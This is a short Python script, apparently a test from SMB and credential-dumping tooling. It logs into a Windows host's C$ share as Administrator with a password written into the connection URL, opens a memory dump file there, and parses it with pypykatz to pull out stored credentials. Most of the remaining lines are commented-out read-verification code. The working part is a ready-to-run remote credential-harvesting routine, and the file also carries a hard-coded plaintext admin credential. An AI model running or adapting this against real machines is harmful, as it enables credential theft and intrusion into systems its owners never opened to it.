import asyncio
from concurrent.futures import ProcessPoolExecutor


from aiosmb.commons.connection.url import SMBConnectionURL
from aiosmb.commons.interfaces.machine import SMBMachine
from aiosmb import logger
from pypykatz.pypykatz import pypykatz
import random

def parse_file(bfile):
	bfile.open('C$\\temp\\x64_win10_10240_4.dmp', 'r')
	#with open('/media/devel/HRM_SSS_X64FREE_EN-US_DV5/x64_win10_10240_4.dmp', 'rb') as f:
	#	f.seek(0, 2)
	#	size = f.tell()
	#	print(size)
	#	for i in range(1024):
	#		
	#		pos = random.randint(0, size)
	#		count = random.randint(0, min(size - pos, 70000))
	#		print('%s Pos: %s Count: %s ' % (i, pos, count))
	#		
	#		f.seek(pos, 0)
	#		data_orig = f.read(count)
	#		
	#		bfile.seek(pos, 0)
	#		data = bfile.read(count)
    #
	#		if data_orig != data:
	#			
	#			for i in range(len(data)):
	#				if data[i] != data_orig[i]:
	#					print(data_orig[i-10:])
	#					print()
	#					print(data[i-10:])
	#					break
	#			raise Exception('Data mismatch!')

	#print('hello')
	#
	#data = bfile.read(0x50)
	#print(data)
	#bfile.seek(1, 0)
	#data = bfile.read(0x50)
	#print(data)
	#bfile.close()
	try:
		mimi = pypykatz.parse_minidump_external(bfile)
	finally:
		bfile.close()
		bfile.terminate()
	return mimi

async def test(url):
	conn_url = SMBConnectionURL(url)
	connection  = conn_url.get_connection()
	logger.debug(conn_url.get_credential())
	logger.debug(conn_url.get_target())
	await connection.login()
	machine = SMBMachine(connection)
	bfile = machine.get_blocking_file()
	
	loop = asyncio.get_running_loop()
	executor = ProcessPoolExecutor(max_workers=1)
	out = await loop.run_in_executor(executor, parse_file, bfile)  # This does not
	print('!!!!!!!!!!!!!!!!!!')
	print(str(out))
	



def main():
	import argparse
	import logging
	logging.basicConfig(level=logging.DEBUG)
	url = 'smb+ntlm-password://Administrator:QLFbT8zkiFGlJuf0B3Qq@10.10.10.2'
	asyncio.run(test(url))

if __name__ == '__main__':
	main()